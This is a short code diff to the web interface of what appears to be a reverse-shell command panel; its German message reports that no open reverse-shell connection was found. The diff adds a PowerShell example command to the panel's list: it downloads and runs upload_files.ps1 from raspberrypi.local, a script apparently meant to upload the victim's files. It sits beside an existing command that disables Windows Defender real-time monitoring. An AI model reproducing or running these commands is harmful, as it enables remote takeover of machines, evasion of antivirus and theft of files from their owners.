@@ -177,7 +177,7 @@ $(document).ready(()=>{
 
     }else if(event.keyCode === 38){ //up
       if(commandsListIndex === 0) return;
-      
+
       commandsListIndex--;
       commandsListIndex = (commandsListIndex < 0 ? 0 : commandsListIndex)
       $('.active .inputcontainer input').val(commandsList[commandsListIndex])
@@ -310,6 +310,7 @@ function toggleExamples(){
       <li style="color:#f1c">Set-MpPreference -DisableRealtimeMonitoring $false</li>
       <li style="color:#f1c">Set-MpPreference -DisableRealtimeMonitoring $true</li>
       <li style="color:#f1c">Stop-computer</li>
+      <li style="color:#f1c">IEX (New-Object Net.Webclient).DownloadString('http://raspberrypi.local/files/upload_files.ps1')</li>
     </ul>
   </div>
   <div class="noshelloverlay"><span>Keine offene Reverse-Shell-Verbindung gefunden</span></div>
